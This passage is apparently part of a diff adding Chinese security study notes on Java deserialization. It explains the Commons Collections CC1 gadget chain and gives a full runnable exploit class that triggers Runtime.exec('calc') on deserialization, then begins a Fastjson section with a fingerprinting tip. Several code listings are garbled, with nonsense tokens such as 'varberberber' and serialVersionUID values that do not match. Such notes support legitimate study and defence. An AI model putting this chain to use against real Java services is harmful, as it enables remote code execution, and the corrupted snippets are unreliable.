+            transformerChain.transform(new Object());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+```
+
+3、案例3- POC构造实现反序列化调用EXEC
+
+**LazyMap**
+
+LazyMap本质上也是一个Map，它允许指定一个Transformer作为它的工厂类。 
+
+工厂类的意思是，当进行Map操作时，这个工厂类会对它进行修饰(使用工厂类的transform函数)
+
+```java
+// 继承自 LazyMap 类的构造函数
+protected LazyMap(Map map, Transformer factory) {
+    // 调用父类的构造函数并传入 map
+    super(map);
+
+    // 如果传入的 factory 是 null，抛出异常
+    if (factory == null) {
+        throw new IllegalArgumentException("Factory must not be null");
+    }
+
+    // 设置工厂变量
+    this.factory = factory;
+}
+
+// 重写父类的 get 方法
+public Object get(Object key) {
+    // 如果键不在映射中
+    if (!map.containsKey(key)) {
+        // 创建对应键的值
+        Object value = factory.transform(key);
+
+        // 将键值对放入映射中
+        map.put(key, value);
+
+        // 返回值
+        return value;
+    }
+
+    // 如果键存在于映射中，则直接返回对应的值
+    return map.get(key);
+}
+
+```
+
+**AnnotationInvocationHandler** 
+
+最后一步，我们需要寻找在重载了readObject函数中，会调用map属性get方法的类。 没错，这个类就是AnnotationInvocationHandler，首先看一下它的类声明。
+
+```java
+// 实现 InvocationHandler 和 Serializable 接口的类
+class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+
+    // 序列化版本号
+    private static final long serialVersionUID = 6182022883658399397L;
+
+    // 注解类型
+    private final Class<? extends Annotation> type; // type: class@707
+
+    // 存储注解成员的值
+    private final Map<String, Object> memberValues; // membervalues: lazymap@741
+
+    // 用于存储注解类型的成员方法的缓存，初始时为 null
+    private transient volatile Method[] memberMethods = null; // membermethods: null
+}
+
+```
+
+可以看到存在对应的map属性，接下来查看它的invoke方法，可以看到调用了get方法
+
+```java
+public Object invoke(Object var1, Method var2, Object[] var3) {
+    // var1: 代理对象，var2: 被调用的方法，var3: 方法的参数数组
+    // var1: $proxy0@738, var2: method@739, var3: null
+
+    // 获取被调用方法的名字
+    String var4 = var2.getName(); // var4 (slot 4): "entryset" 或 "set"
+
+    // 获取被调用方法的参数类型数组
+    Class[] vars = var2.getParameterTypes(); // vars (slot s): class[oje74d var2: method@739
+
+    // 如果方法名为 "equals"，且参数个数为 1，且参数类型为 Object 类型
+    if (var4.equals("equals") && var3.length == 1 && vars[0].equals(Object.class)) {
+        return this.equalsImpl(var3[0]); // 执行 equals 方法
+    } else {
+        assert var3.length == 0; // 断言参数个数为 0
+        // var5 (slot_5): class[0]@740
+
+        // 如果方法名为 "toString"
+        if (var4.equals("toString")) {
+            return this.toStringImpl(); // 执行 toString 方法
+        } else if (var4.equals("hashCode")) { // 如果方法名为 "hashCode"
+            return this.hashCodeImpl(); // 执行 hashCode 方法
+        } else if (var4.equals("annotationType")) { // 如果方法名为 "annotationType"
+            return this.type; // 返回注解类型信息
+            // type: class@707
+        } else { // 对于其他方法名
+            Object var6 = this.memberValues.get(var4); // 从成员值中获取对应值
+            // membervalues: lazymap@741, var4 (slot 4): "entryset"
+            return var6; // 返回对应值
+        }
+    }
+}
+
+```
+
+**AnnotationInvocationHandler** 
+
+这里有一个问题，就是AnnotationInvocationHandler在它重载的readObject函数当中，并没有调用 invoke方法，为什么它却是可以利用的? 
+
+```java
+private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+    var1.defaultReadObject(); // 默认反序列化对象
+
+    AnnotationType var2 = null;
+
+    try {
+        var2 = AnnotationType.getInstance(this.type); // 获取注解类型信息
+    } catch (IllegalArgumentException var9) {
+        throw new InvalidObjectException("Non-annotation type in annotation serialization stream");
+    }
+
+    Map<String, Class<?>> var3 = var2.memberTypes(); // 获取注解成员类型的映射
+
+    // 遍历成员值的 entrySet
+    Iterator<Entry<String, Object>> var4 = this.memberValues.entrySet().iterator(); // 没有invoke
+    while (var4.hasNext()) {
+        Entry<String, Object> var5 = var4.next();
+        String var6 = var5.getKey(); // 获取键
+        Class<?> var7 = var3.get(var6); // 获取对应键的类型
+
+        if (var7 != null) {
+            Object var8 = var5.getValue(); // 获取值
+
+            // 检查值是否与类型相符
+            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
+                // 如果类型不匹配，抛出异常
+                throw new AnnotationTypeMismatchException(varb.getClass() + varb, varberberber((null));
+            }
+
+            // 将值设置到相应的字段上
+            vars.setValue(var8);
+        }
+    }
+}
+
+```
+
+让我们重新注意一下AnnotationInvocationHandler的声明
+
+```java
+// 实现 InvocationHandler 和 Serializable 接口的类
+class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+
+    // 序列化版本号
+    private static final long serialVersionUID = 6182022883658397L;
+
+    // 注解类型
+    private final Class<? extends Annotation> type;
+
+    // 存储注解成员的值
+    private final Map<String, Object> memberValues;
+
+    // 用于存储注解类型的成员方法的缓存，初始时为 null
+    private transient volatile Method[] memberMethods = null;
+
+    // 构造函数，接收注解类型和成员值的映射
+    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
+        // 初始化注解类型和成员值映射
+        this.type = var1;
+        this.memberValues = var2;
+    }
+}
+
+```
+
+让我们重新注意一下AnnotationInvocationHandler的声明
+
+```java
+import java.lang.annotation.Annotation;
+import java.lang.reflect.Method;
+import java.io.Serializable;
+import java.util.Map;
+
+public class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+    private static final long serialVersionUID = 6182022883658397L;
+
+    // 存储注解的类型信息
+    private final Class<? extends Annotation> type;
+
+    // 存储注解成员的值
+    private final Map<String, Object> memberValues;
+
+    // 用于存储注解类型的成员方法的缓存，初始时为 null
+    private transient volatile Method[] memberMethods = null;
+
+    // 构造函数，接收注解类型和成员值的映射作为参数
+    public AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
+        this.type = var1; // 设置注解类型
+        this.memberValues = var2; // 设置注解成员的值
+    }
+}
+
+```
+
+它是一个**动态代理类**，这意味着我们可以使用该类包裹我们的LazyMap，这样就能触发它的invoke函数
+
+```java
+// 使用 AnnotationInvocationHandler 包装
+class AnnotationInvocationHandlerClazz {
+    // 获取 AnnotationInvocationHandler 类
+    Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+
+    // 获取 AnnotationInvocationHandler 的构造函数
+    Constructor<?> annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructors()[0];
+
+    // 设置构造函数可访问
+    annotationInvocationHandlerConstructor.setAccessible(true);
+
+    // 创建一个代理映射
+    Map proxyMap = (Map) Proxy.newProxyInstance(
+            this.getClass().getClassLoader(),
+            new Class[]{Map.class},
+            new InvocationHandler() {
+                @Override
+                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+                    return null; // 在此处实现代理方法
+                }
+            }
+    );
+}
+
+```
+
+在AnnotationInvocationHandler的ReadObject中，它直接操作了自身的map
+
+```java
+// 获取注解成员类型的映射
+Map<String, Class<?>> var3 = var2.memberTypes();
+
+// 遍历成员值的 entrySet
+Iterator<Entry<String, Object>> var4 = this.memberValues.entrySet().iterator();
+while (var4.hasNext()) {
+    Entry<String, Object> var5 = var4.next();
+
+    // 获取键
+    String var6 = var5.getKey();
+
+    // 获取键对应的类型
+    Class<?> var7 = var3.get(var6);
+
+    // 如果类型不为空
+    if (var7 != null) {
+        // 获取值
+        Object var8 = var5.getValue();
+
+        // 检查值是否与类型相符
+        if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
+            // 如果类型不匹配，进行相应处理
+            // 这里的处理逻辑可能涉及异常情况的处理
+        }
+    }
+}
+
+```
+
+**这个链里面所有的核心知识点都讲完了，剩下就需要我们把这几个部分拼装起来就大功告成**
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1Test3 {
+    public static void main(String[] args) {
+        final Transformer transformerChain = new ChainedTransformer(
+            new Transformer[]{ new ConstantTransformer(1) });
+        // real chain for after setup
+        final Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {
+                String.class, Class[].class }, new Object[] {
+                "getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {
+                Object.class, Object[].class }, new Object[] {
+                null, new Object[0] }),
+            new InvokerTransformer("exec",
+                new Class[] { String.class }, new String[]{"calc"}),
+            new ConstantTransformer(1) };
+
+        try{
+            //构造ChainedTransfomer
+            Class chainedTransformer = Class.forName("org.apache.commons.collections.functors.ChainedTransformer");
+            Field iTransformers = chainedTransformer.getDeclaredField("iTransformers");
+            iTransformers.setAccessible(true);
+            iTransformers.set(transformerChain, transformers);
+
+            //构造LazyMap
+            Map map = LazyMap.decorate(new HashMap(), transformerChain);
+
+            //使用AnnotationInvocationHandler包裹
+            Class annotationInvocationHandlerClazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+            Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClazz.getDeclaredConstructors()[0];
+            annotationInvocationHandlerConstructor.setAccessible(true);
+            Map proxyMap =(Map) Proxy.newProxyInstance(
+                map.getClass().getClassLoader(), map.getClass().getInterfaces(), (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, map));
+
+            //return proxyMap 可以触发命令执行吗？ proxyMap (Map) -> readObject
+            //将包裹后的map添加到AnnotationInvocationHandler中
+            InvocationHandler annotationInvocationHandler = (InvocationHandler)annotationInvocationHandlerConstructor.newInstance(Override.class, proxyMap);
+
+            //反序列化验证
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("D:\\ser.ser"));
+            objectOutputStream.writeObject(annotationInvocationHandler);
+            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("D:\\ser.ser"));
+            objectInputStream.readObject();
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+
+
+## 十一、Fastjson漏洞
+
+![image-20231121162500962](/Users/bingtanghulu/Library/Application Support/typora-user-images/image-20231121162500962.png)
+
+**基础介绍**
+
+Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将 序列化的速度提升到极致，深受用户喜爱。 项目地址：https://github.com/alibaba/fastjson。
+
+产品主要提供两个接口 JSON.toJSONString 和 **JSON.parseObject/JSON.parse** 来分别实现 序列化和反序列化操作。 产品识别：使用不闭合花括号进行报错回显，报错中往往带有fastjson
